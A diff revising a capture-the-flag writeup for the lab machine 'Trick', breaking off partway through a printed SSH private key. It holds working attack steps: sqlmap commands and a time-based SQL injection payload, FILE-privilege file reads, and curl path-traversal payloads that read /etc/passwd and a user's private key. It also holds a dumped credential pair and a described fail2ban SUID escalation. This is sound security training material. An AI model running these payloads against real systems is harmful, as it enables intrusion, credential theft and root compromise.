@@ -1,20 +1,24 @@
 
-| Property         | Value                    |
-| ---------------- | ------------------------ |
-| **OS**           | Linux                    |
-| **Difficulty**   | Easy                     |
-| **Release Date** | 18th June, 2022          |
-| **State**        | YYYY-MM-DD               |
-| **IP**           | 10.10.10.X               |
-| **Techniques**   | technique-1, technique-2 |
-| **Tags**         | #web #privesc #linux     |
+| Property         | Value                                                                                                                            |
+| ---------------- | -------------------------------------------------------------------------------------------------------------------------------- |
+| **OS**           | Linux                                                                                                                            |
+| **Difficulty**   | Easy                                                                                                                             |
+| **Release Date** | 2026-09-15                                                                                                                       |
+| **State**        | Active                                                                                                                           |
+| **IP**           | 10.129.227.180                                                                                                                   |
+| **Techniques**   | DNS zone transfer, SQL injection, `FILE` privilege abuse, path traversal, sudo misconfiguration, fail2ban action-file SUID abuse |
+| **Tags**         | #web #privesc #linux #dns #sqli                                                                                                  |
+
+> **Note:** The machine's IP address changes across sections of this writeup due to restarts (`10.129.227.180`, `10.129.137.188`).
 
 ---
+
 ## Summary
 
-Brief 2-3 sentence ogverview of the machine and attack path.
+Trick is an easy Linux machine hosting a web page on port 80, alongside SSH, SMTP, and a DNS server. An unrestricted **AXFR zone transfer** against the domain's own nameserver discloses a hidden virtual host, `preprod-payroll.trick.htb`. This site is vulnerable to a SQL injection in its login form, which is used with `sqlmap` to dump the backend database. Although the recovered application credentials are a dead end, the database user turns out to hold the MySQL `FILE` privilege, which is abused to read arbitrary files off the server, including the Nginx site configuration. That configuration discloses a second virtual host, `preprod-marketing.trick.htb`, whose `page` parameter is vulnerable to **path traversal**, allowing file read disclosing the user `michael`'s SSH private key. Privilege escalation abuses a `sudo` rule that lets `michael` restart the `fail2ban` service, combined with group-membership write access to fail2ban's `action.d` directory: the `iptables-multiport.conf` action file is edited so that its "ban" action sets the SUID bit on `/bin/bash` instead of blocking traffic, and triggering a fail2ban ban (via a simulated SSH brute-force) executes that action as root, granting a root shell.
 
 ---
+
 ## Enumeration
 
 ### Nmap Scan
@@ -43,13 +47,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 247.77 seconds
-                                                                                            
 ```
+
+The scan discloses SSH (22), an SMTP listener that refuses a banner grab (25), a BIND DNS server (53), and an Nginx web server (80) serving a static "coming soon" placeholder page. 
 
 ### DNS Zone Transfer
 
+An **AXFR (Asynchronous Full Transfer of Zone)** request is a legitimate DNS mechanism intended for secondary nameservers to replicate an entire zone from the primary. When a nameserver fails to restrict which hosts may request one, any client can pull a full listing of every record in the zone — a common and severe misconfiguration.
+
 ```
-dig AXFR @trick.htb trick.htb                           
+dig AXFR @trick.htb trick.htb
 
 ; <<>> DiG 9.20.15-2-Debian <<>> AXFR @trick.htb trick.htb
 ; (1 server found)
@@ -63,245 +70,87 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
 ;; Query time: 48 msec
 ;; SERVER: 10.129.227.180#53(trick.htb) (TCP)
 ;; WHEN: Wed Sep 16 07:59:42 EDT 2026
-;; XFR size: 6 records (messages 1, bytes 231)
-
+;; XFR size: 6 records (messages 1, bytes 313)
 ```
 
-![](./screens/1.png)
+The unrestricted transfer discloses a subdomain that was never linked from the main site: `preprod-payroll.trick.htb`. This is added to `/etc/hosts` for further enumeration:
+
+```
+echo '10.129.227.180 preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
+```
+
+Browsing to it reveals a **Payroll** management login portal:
+
+![](Trick/screens/1.png)
 
 ---
-## SQL injection
 
-How you gained initial access to the machine.
+## Foothold — SQL Injection
 
-### Vulnerability
+### Capturing the Login Request
 
-Description of the vulnerability exploited.
+The login form posts to `ajax.php`. The request is captured in Burp Suite and saved for use with `sqlmap`:
 
-### Exploitation
-
-Capturing the login request with burpsuite:
-
-```shell
+```http
 POST /ajax.php?action=login HTTP/1.1
 Host: preprod-payroll.trick.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 Content-Length: 27
 Origin: http://preprod-payroll.trick.htb
-Connection: keep-alive
 Referer: http://preprod-payroll.trick.htb/login.php
 Cookie: PHPSESSID=pnaaf157pig45llsg0ft7hdrip
-Priority: u=0
 
 username=test&password=test
+```
 
+### Confirming the Injection
+
+```
+sqlmap -r req.txt --batch
 ```
 
 ```
-sqlmap -r req.txt --batch 
-        ___
-       __H__                                                                                                                                                                                                                                
- ___ ___[,]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
-|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 08:41:32 /2026-09-16/
-
-[08:41:32] [INFO] parsing HTTP request from 'req.txt'
-[08:41:32] [INFO] testing connection to the target URL
-[08:41:32] [INFO] testing if the target URL content is stable
-[08:41:33] [INFO] target URL content is stable
-[08:41:33] [INFO] testing if POST parameter 'username' is dynamic
-[08:41:33] [WARNING] POST parameter 'username' does not appear to be dynamic
-[08:41:33] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
 [08:41:33] [INFO] testing for SQL injection on POST parameter 'username'
-[08:41:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[08:41:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[08:41:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[08:41:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
-[08:41:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
-[08:41:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
-[08:41:35] [INFO] testing 'Generic inline queries'
-[08:41:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
-[08:41:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
-[08:41:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
-[08:41:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
-[08:41:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
-it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
-[08:41:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[08:41:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[08:41:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-[08:41:47] [INFO] target URL appears to have 8 columns in query
-do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
-injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
-[08:41:51] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[08:41:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
 [08:41:52] [INFO] target URL appears to be UNION injectable with 8 columns
-injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
-[08:41:56] [INFO] checking if the injection point on POST parameter 'username' is a false positive
-POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
+
+sqlmap identified the following injection point(s):
 ---
 Parameter: username (POST)
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
 ---
-[08:42:12] [INFO] the back-end DBMS is MySQL
-[08:42:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
-web application technology: Nginx 1.14.2
 back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[08:42:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-[08:42:17] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 08:42:17 /2026-09-16/
-
 ```
+
+The `username` field is not sanitized before being placed into the login query, allowing a boolean/time-based blind injection. A UNION-based path is also flagged as usable, but the more reliable time-based technique is what `sqlmap` settles on.
 
 ### Database Enumeration
 
+Enumerating available databases and tables:
+
 ```
- sqlmap -r req.txt --batch --dump
-        ___
-       __H__                                                                                                                                                                                                                                
- ___ ___[']_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
-|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+sqlmap -r req.txt --batch --dump
+```
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 08:43:17 /2026-09-16/
-
-[08:43:17] [INFO] parsing HTTP request from 'req.txt'
-[08:43:17] [INFO] resuming back-end DBMS 'mysql' 
-[08:43:17] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: username (POST)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
----
-[08:43:17] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.14.2
-back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[08:43:17] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
-[08:43:17] [INFO] fetching current database
-[08:43:17] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
-[08:43:25] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-[08:43:35] [INFO] adjusting time delay to 1 second due to good response times
-payroll_db
+```
+[*] payroll_db
 [08:44:15] [INFO] fetching tables for database: 'payroll_db'
-[08:44:15] [INFO] fetching number of tables for database 'payroll_db'
-[08:44:15] [INFO] retrieved: 11
-[08:44:18] [INFO] retrieved: position
-[08:44:53] [INFO] retrieved: employee
-[08:45:23] [INFO] retrieved: department
-[08:46:02] [INFO] retrieved: payroll_items
-[08:46:56] [INFO] retrieved: attendance
-[08:47:31] [INFO] retrieved: employee_deductions
-[08:48:45] [INFO] retrieved: employee_allowances
-[08:49:32] [INFO] retrieved: users
-[08:49:50] [INFO] retrieved: deductions
-[08:50:27] [INFO] retrieved: payroll
-[08:50:57] [INFO] retrieved: allowances
-[08:51:34] [INFO] fetching columns for table 'allowances' in database 'payroll_db'
-[08:51:34] [INFO] retrieved: 3
-[08:51:38] [INFO] retrieved: id
-[08:51:45] [INFO] retrieved: allowance
-[08:52:18] [INFO] retrieved: description
-[08:53:00] [INFO] fetching entries for table 'allowances' in database 'payroll_db'
-[08:53:00] [INFO] fetching number of entries for table 'allowances' in database 'payroll_db'
-[08:53:00] [INFO] retrieved: 4
-[08:53:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
-Sample Allowance
-[08:54:03] [INFO] retrieved: Sample
-[08:54:26] [INFO] retrieved: 1
-[08:54:29] [INFO] retrieved: Phone Allowance
-[08:55:32] [INFO] retrieved: Phon^C
-[08:55:54] [WARNING] Ctrl+C detected in dumping phase                                                                                                                                                                                      
-Database: payroll_db
-Table: allowances
-[1 entry]
-+----+-----------+------------------+
-| id | allowance | description      |
-+----+-----------+------------------+
-| 1  | Sample    | Sample Allowance |
-+----+-----------+------------------+
+position, employee, department, payroll_items, attendance,
+employee_deductions, employee_allowances, users, deductions, payroll, allowances
+```
 
-[08:55:54] [INFO] table 'payroll_db.allowances' dumped to CSV file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/allowances.csv'
-[08:55:54] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-[08:55:54] [WARNING] your sqlmap version is outdated
+Dumping the `users` table:
 
-[*] ending @ 08:55:54 /2026-09-16/
-
-
+```
+sqlmap -r req.txt --dump -T users -D payroll_db
 ```
 
 ```
-sqlmap -r req.txt --dump -T users -D payroll_db 
-        ___
-       __H__                                                                                                                                                                                                                                
- ___ ___[(]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
-|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 09:06:07 /2026-09-16/
-
-[09:06:07] [INFO] parsing HTTP request from 'req.txt'
-[09:06:07] [INFO] resuming back-end DBMS 'mysql' 
-[09:06:07] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: username (POST)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
----
-[09:06:07] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.14.2
-back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[09:06:07] [INFO] fetching columns for table 'users' in database 'payroll_db'
-[09:06:07] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
-[09:06:17] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-[09:06:27] [INFO] adjusting time delay to 1 second due to good response times
-8
-[09:06:27] [INFO] retrieved: id
-[09:06:34] [INFO] retrieved: doctor_id
-[09:07:14] [INFO] retrieved: name
-[09:07:27] [INFO] retrieved: address
-[09:07:51] [INFO] retrieved: contact
-[09:08:17] [INFO] retrieved: username
-[09:08:43] [INFO] retrieved: password
-[09:09:16] [INFO] retrieved: type
-[09:09:34] [INFO] fetching entries for table 'users' in database 'payroll_db'
-[09:09:34] [INFO] fetching number of entries for table 'users' in database 'payroll_db'
-[09:09:34] [INFO] retrieved: 1
-[09:09:35] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
-Administrator
-[09:10:25] [INFO] retrieved: 1
-[09:10:28] [INFO] retrieved: 
-[09:10:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
-[09:10:28] [INFO] retrieved: 
-[09:10:29] [INFO] retrieved: 0
-[09:10:35] [INFO] retrieved: 1
-[09:10:37] [INFO] retrieved: SuperGucciRainbowCake
-[09:11:55] [INFO] retrieved: Enemigosss
 Database: payroll_db
 Table: users
 [1 entry]
@@ -310,259 +159,131 @@ Table: users
 +----+-----------+---------------+--------+---------+---------+-----------------------+------------+
 | 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
 +----+-----------+---------------+--------+---------+---------+-----------------------+------------+
-
-[09:12:32] [INFO] table 'payroll_db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/users.csv'
-[09:12:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-[09:12:32] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 09:12:32 /2026-09-16/
-
-                                                    
 ```
 
-Enemigosss:SuperGucciRainbowCake (useless)
+The recovered pair (`Enemigosss:SuperGucciRainbowCake`) does not correspond to any usable OS-level or service account — it turns out to be a dead end for direct login, but the SQL injection itself is not finished yielding value yet.
+
+### Escalating the Injection — `FILE` Privilege
+
+Rather than stop at data exfiltration, `sqlmap` is used to check what privileges the connecting database user holds:
 
 ```
- sqlmap -r req.txt --privilege                        
-        ___
-       __H__                                                                                                                                                                                                                                
- ___ ___["]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
-|_ -| . [,]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+sqlmap -r req.txt --privilege
+```
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 17:07:40 /2026-09-17/
-
-[17:07:40] [INFO] parsing HTTP request from 'req.txt'
-[17:07:40] [INFO] resuming back-end DBMS 'mysql' 
-[17:07:40] [INFO] testing connection to the target URL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: username (POST)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=test' AND (SELECT 6469 FROM (SELECT(SLEEP(5)))WAoc) AND 'oCFZ'='oCFZ&password=test
----
-[17:07:41] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.14.2
-back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[17:07:41] [INFO] fetching database users privileges
-[17:07:41] [INFO] fetching database users
-[17:07:41] [INFO] fetching number of database users
-[17:07:41] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
-[17:07:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
-1
-[17:07:49] [INFO] retrieved: 
-[17:07:59] [INFO] adjusting time delay to 1 second due to good response times
-'remo'@'localhost'
-[17:09:10] [INFO] fetching number of privileges for user 'remo'
-[17:09:10] [INFO] retrieved: 1
-[17:09:11] [INFO] fetching privileges for user 'remo'
-[17:09:11] [INFO] retrieved: FILE
+```
 database management system users privileges:
-[*] %remo% [1]:
+[*] 'remo'@'localhost' [1]:
     privilege: FILE
-
-[17:09:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-[17:09:24] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 17:09:24 /2026-09-17/
-
-
 ```
 
-```
-sqlmap -r req.txt --file-read="/etc/nginx/nginx.conf" --batch              
-        ___
-       __H__                                                                                                                                                                                                                                
- ___ ___[']_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
-|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
-|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
-      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+The database account `remo` holds the MySQL **`FILE`** privilege. In MySQL/MariaDB, a user with this privilege can call `LOAD_FILE()` to read arbitrary files the database process has permission to open, and `sqlmap`'s `--file-read` option wraps this primitive automatically through the existing injection point.
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 09:34:32 /2026-09-18/
-
-[09:34:32] [INFO] parsing HTTP request from 'req.txt'
-[09:34:32] [INFO] resuming back-end DBMS 'mysql' 
-[09:34:32] [INFO] testing connection to the target URL
-[09:35:02] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
-[09:35:02] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: username (POST)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=t' AND (SELECT 8901 FROM (SELECT(SLEEP(5)))nlQl) AND 'gKti'='gKti&password=t
----
-[09:35:03] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.14.2
-back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[09:35:03] [INFO] fingerprinting the back-end DBMS operating system
-[09:35:03] [INFO] the back-end DBMS operating system is Linux
-[09:35:03] [INFO] fetching file: '/etc/nginx/nginx.conf'
-[09:35:03] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
-[09:35:23] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
-[09:35:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-
-[09:35:40] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
-[09:35:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-[09:35:40] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 09:35:40 /2026-09-18/
+### Reading the Nginx Configuration
 
 ```
-
-```
-cat /home/kali/.local/share/sqlmap/output/preprod-
-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
+sqlmap -r req.txt --file-read="/etc/nginx/nginx.conf" --batch
 ```
 
-```
+The retrieved `sites-enabled/default` file (saved locally by `sqlmap` under its output directory) reveals a **second, undisclosed virtual host** that also was not found through the zone transfer:
+
+```nginx
 server {
-listen 80;
-listen [::]:80;
-server_name preprod-marketing.trick.htb;
-In the configuration file we see a new vHost called preprod-marketing.trick.htb . Let's add this to our
-hosts file as well.
-Marketing
-Having added the new domain to our hosts file we can visit the website.
-root /var/www/market;
-index index.php;
-location / {
-try_files $uri $uri/ =404;
-}
-location ~ \.php$ {
-include snippets/fastcgi-php.conf;
-fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
-}
+    listen 80;
+    listen [::]:80;
+    server_name preprod-marketing.trick.htb;
+    root /var/www/market;
+    index index.php;
+    location / {
+        try_files $uri $uri/ =404;
+    }
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+    }
 }
 server {
-listen 80;
-listen [::]:80;
-server_name preprod-payroll.trick.htb;
-root /var/www/payroll;
-index index.php;
-location / {
-try_files $uri $uri/ =404;
-}
-location ~ \.php$ {
-include snippets/fastcgi-php.conf;
-fastcgi_pass unix:/run/php/php7.3-fpm.sock;
-}
+    listen 80;
+    listen [::]:80;
+    server_name preprod-payroll.trick.htb;
+    root /var/www/payroll;
+    index index.php;
+    location / {
+        try_files $uri $uri/ =404;
+    }
+    location ~ \.php$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+    }
 }
 ```
 
+Two details stand out: the newly-disclosed `preprod-marketing.trick.htb` vhost, and the fact that its PHP-FPM pool socket is named `php7.3-fpm-michael.sock` — a strong hint that this site's PHP worker runs specifically as the user `michael`.
 
+```
+echo '10.129.227.180 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
+```
 
-## Path traversal
+---
+
+## Local File Inclusion / Path Traversal
+
+Browsing `preprod-marketing.trick.htb` reveals a marketing site that loads its content dynamically through a `page` GET parameter (e.g. `index.php?page=about`), a classic pattern for a local file inclusion vulnerability if the parameter is not validated against a fixed allow-list.
+
+### Reading `/etc/passwd`
+
+Directory traversal sequences are doubled up (`....//`) to survive any naive single-pass `../` stripping filter:
 
 ```
 curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
+```
+
+```
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
-tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
-dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
-pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
-speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
-avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
-saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
-colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
-geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
-hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
-Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+...
 mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
 postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
 bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
 michael:x:1001:1001::/home/michael:/bin/bash
+```
 
+This confirms arbitrary file read and surfaces `michael` as the only non-system account on the box — consistent with the `php-fpm-michael.sock` naming seen in the Nginx config.
+
+### Reading `michael`'s SSH Private Key
+
+Since the LFI grants read access to any file the web server (and, by the PHP-FPM pool binding, effectively `michael`) can open, `michael`'s own SSH key is a natural next target:
+
+```
+curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
 ```
 
 ```
- curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
-c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
-YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
-4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
-Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
-1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
-DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
-+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
-hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
-jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
-IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
